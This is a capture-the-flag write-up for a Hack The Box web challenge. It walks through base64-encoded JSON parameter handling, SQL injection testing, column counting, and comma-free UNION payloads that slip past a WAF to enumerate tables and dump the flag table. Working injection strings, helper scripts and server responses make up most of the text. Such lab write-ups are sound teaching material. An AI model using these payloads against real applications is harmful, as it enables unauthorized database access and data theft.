# ezpz Challenge

Navigating to the site we are presented with two error messages:

```
Notice: Undefined index: obj in /var/www/html/index.php on line 27

Notice: Trying to get property 'ID' of non-object in /var/www/html/index.php on line 29
```

If we look at the source we also see

```html
<!-- Hint : base64_encode($data)-->
```

Given that obj is an undefined index, let's see if it's a query parameter:

```shell-session
╭─zoey@nomadic ~/htb/challenges/ezpz ‹master*›
╰─$ curl --silent "docker.hackthebox.eu:30870/?obj" | grep -v '^$'
```

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Easy Peasy..</title>
  </head>
  <body bgcolor="#A9A9A9">
    <center>
      <br /><br /><br /><br /><br /><br /><br />
      <br />
      <b>Notice</b>: Trying to get property 'ID' of non-object in
      <b>/var/www/html/index.php</b> on line <b>29</b><br />
    </center>
  </body>
</html>
<!-- Hint : base64_encode($data)-->
```

This seems to remove the first error. Let's assume that `obj` is a JSON object with an `ID` property and try another request, but according to
the hint, we need to base64 encode it. Let's setup a script to do that.

```php
<?php

$data='{"ID":"' . $argv[1] .'"}';
echo base64_encode($data)."\n";
```

And now lets plug the output from it into a request

```shell-session
╭─zoey@nomadic ~/htb/challenges/ezpz ‹master*›
╰─$ php ezpz-payload.php 1
eyJJRCI6IjEifQ==
╭─zoey@nomadic ~/htb/challenges/ezpz ‹master*›
╰─$ curl --silent "docker.hackthebox.eu:30870/?obj=eyJJRCI6IjEifQ==" | grep -v '^$'
```

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Easy Peasy..</title>
  </head>
  <body bgcolor="#A9A9A9">
    <center>
      <br /><br /><br /><br /><br /><br /><br />
      <h4 style="color:black; font-family: verdana">
        Good Luck, You've got that this is really gonna be an intersting
        challenge :)
      </h4>
    </center>
  </body>
</html>
<!-- Hint : base64_encode($data)-->
```

Success. Let's setup a script so we can easily rerun this request, and remove some of the extraneous output:

```bash
#!/bin/sh

payload=$(php gen-payload.php "${1}")
echo "${payload}"
curl --silent "http://docker.hackthebox.eu:30870/?obj=${payload}" | sed -n '/<br>/,/\/center/p;/\/center/q' | grep -v '^$' | grep -v "<br><br><br><br>\|</center>"
```

And now we'll test for SQL injection:

```shell-session
╭─zoey@nomadic ~/htb/challenges/ezpz ‹master*›
╰─$ ./ezpz.sh "'"
eyJJRCI6IicifQ==
```

```html
<br />
<b>Warning</b>: mysqli_fetch_assoc() expects parameter 1 to be mysqli_result,
bool given in <b>/var/www/html/index.php</b> on line <b>34</b><br />
```

Now that we know it works, let's see what we can dump:

```shell-session
╭─zoey@nomadic ~/htb/challenges/ezpz ‹master*›
╰─$ ./ezpz.sh "1' or 1#"
eyJJRCI6IjEnIG9yIDEjIn0=
```

```html
<h4 style="color:black; font-family: verdana">
  Good Luck, You've got that this is really gonna be an intersting challenge :)
</h4>
<h4 style="color:black; font-family: verdana">
  Avoid Tools, If you wan't to Enjoy the Challenge :v ..
</h4>
<h4 style="color:black; font-family: verdana">
  Go and Find the vulnerability ..
</h4>
```

We were able to dump all the results from the current table. Let's see what we can get away with. Quite a few different patterns end up returning a message
about the request being blocked by the server's application firewall.

```sql
"ORDER BY"
"OFFSET"
","
'/'
"schema.tables"
```

Let's determine how many columns there are

```shell-session
╭─zoey@nomadic ~/htb/challenges/ezpz ‹master*›
╰─$ ./ezpz.sh "1' GROUP BY 2#"
eyJJRCI6IjEnIEdST1VQIEJZIDIjIn0=
<h4 style='color:black; font-family: verdana'>Good Luck, You've got that this is really gonna be an intersting challenge :)</h4>
╭─zoey@nomadic ~/htb/challenges/ezpz ‹master*›
╰─$ ./ezpz.sh "1' GROUP BY 3#"
eyJJRCI6IjEnIEdST1VQIEJZIDMjIn0=
<br />
<b>Warning</b>:  mysqli_fetch_assoc() expects parameter 1 to be mysqli_result, bool given in <b>/var/www/html/index.php</b> on line <b>34</b><br />
```

So we have two columns. Next let's find the table names.

```shell-session
╭─zoey@nomadic ~/htb/challenges/ezpz ‹master*›
╰─$ ./ezpz.sh "1' UNION SELECT * FROM (SELECT database_name FROM mysql.innodb_table_stats)UT1 JOIN (SELECT table_name FROM mysql.innodb_table_stats)UT2 ON UT1.database_name=UT2.table_name OR 1=1#"
eyJJRCI6IjEnIFVOSU9OIFNFTEVDVCAqIEZST00gKFNFTEVDVCBkYXRhYmFzZV9uYW1lIEZST00gbXlzcWwuaW5ub2RiX3RhYmxlX3N0YXRzKVVUMSBKT0lOIChTRUxFQ1QgdGFibGVfbmFtZSBGUk9NIG15c3FsLmlubm9kYl90YWJsZV9zdGF0cylVVDIgT04gVVQxLmRhdGFiYXNlX25hbWU9VVQyLnRhYmxlX25hbWUgT1IgMT0xIyJ9
```

```html
<h4 style="color:black; font-family: verdana">
  Good Luck, You've got that this is really gonna be an intersting challenge :)
</h4>
<h4 style="color:black; font-family: verdana">DATA</h4>
<h4 style="color:black; font-family: verdana">DATA</h4>
<h4 style="color:black; font-family: verdana">FlagTableUnguessableEzPZ</h4>
<h4 style="color:black; font-family: verdana">FlagTableUnguessableEzPZ</h4>
<h4 style="color:black; font-family: verdana">gtid_slave_pos</h4>
<h4 style="color:black; font-family: verdana">gtid_slave_pos</h4>
```

Looks like `FlagTableUnguessableEzPZ` is the table. Let's see if it perhaps has two columns

```shell-session
╭─zoey@nomadic ~/htb/challenges/ezpz ‹master*›
╰─$ ./ezpz.sh "1' UNION SELECT * FROM FlagTableUnguessableEzPZ#"
eyJJRCI6IjEnIFVOSU9OIFNFTEVDVCAqIEZST00gRmxhZ1RhYmxlVW5ndWVzc2FibGVFelBaIyJ9
```

```html
<br />
<b>Warning</b>: mysqli_fetch_assoc() expects parameter 1 to be mysqli_result,
bool given in <b>/var/www/html/index.php</b> on line <b>34</b><br />
```

Nope, let's add another column

```shell-session
╭─zoey@nomadic ~/htb/challenges/ezpz ‹master*›
╰─$ ./ezpz.sh "1' UNION SELECT * FROM (SELECT NULL)UT1 JOIN (SELECT * FROM FlagTableUnguessableEzPZ)UT2 ON 1=1#"
eyJJRCI6IjEnIFVOSU9OIFNFTEVDVCAqIEZST00gKFNFTEVDVCBOVUxMKVVUMSBKT0lOIChTRUxFQ1QgKiBGUk9NIEZsYWdUYWJsZVVuZ3Vlc3NhYmxlRXpQWilVVDIgT04gMT0xIyJ9
```

```html
<h4 style="color:black; font-family: verdana">
  Good Luck, You've got that this is really gonna be an intersting challenge :)
</h4>
<h4 style="color:black; font-family: verdana">
  HTB{T0o**********************3rs}
</h4>
```

And success!

# References

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma/118335
